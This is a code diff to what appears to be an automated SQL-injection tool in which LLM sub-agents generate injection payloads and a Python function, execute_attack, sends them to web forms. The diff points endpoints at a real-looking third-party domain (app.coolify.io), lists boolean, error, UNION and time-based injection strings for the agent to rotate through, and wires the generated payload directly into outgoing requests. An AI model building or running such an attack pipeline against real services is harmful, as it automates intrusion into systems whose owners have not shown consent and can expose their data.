@@ -312,7 +312,7 @@ def parse_json_from_state(value):
     return value
 
 def execute_attack(request_args: dict) -> dict:
-    endpoint = request_args["endpoint"]
+    endpoint = "https://app.coolify.io"+request_args["endpoint"]
     method = request_args["method"]
     data = request_args["data"]
     print(f"Endpoint: {endpoint}")
@@ -642,7 +642,7 @@ Strategy based on feedback:
 - If previous payload was basic → Try encoded, obfuscated, or alternative syntax
 
 Payload types to rotate through:
-1. Boolean-based: ' OR '1'='1, ' OR 1=1--, admin'--
+1. Boolean-based: ' OR 1=1--, " OR "1"="1"--, ' OR 'a'='a
 2. Error-based: ', ", ;, ), etc. to trigger SQL errors
 3. UNION-based: ' UNION SELECT NULL--, ' UNION SELECT 1,2,3--
 4. Time-based: '; WAITFOR DELAY '00:00:05'--, ' OR SLEEP(5)--
@@ -847,7 +847,7 @@ root_agent = SequentialAgent(
     name="SQLInjectionPipeline",
     sub_agents=[
         sql_payload_agent,      # payload agent reads {{form.*}} from state
-        request_builder_agent,
+        # request_builder_agent,
     ]
 )
 # -------------------------------------------------------------------
@@ -957,7 +957,7 @@ async def run():
         # Update state with form data using Event/EventActions
         form_state_changes = {
             "form": form_data,
-            "feedback": "",
+            "feedback": form.get("feedback", ""),
             "payload": ""
         }
         
@@ -1014,9 +1014,12 @@ async def run():
             # ---------- Phase 2: Python execution ----------
             logger.info(f"[Form {form_idx}] Phase 2: Executing attack...")
             state = session.state
-            request_raw = state.get("request")
+            request_raw = state.get("form")
+
+            payload = state.get("payload", "")
             
             request_args = parse_json_from_state(request_raw)
+            request_args['data'] = payload  # Ensure payload is included in request args
             logger.info(f"[Form {form_idx}] Request args (parsed): {request_args}")
             
             if not request_args:
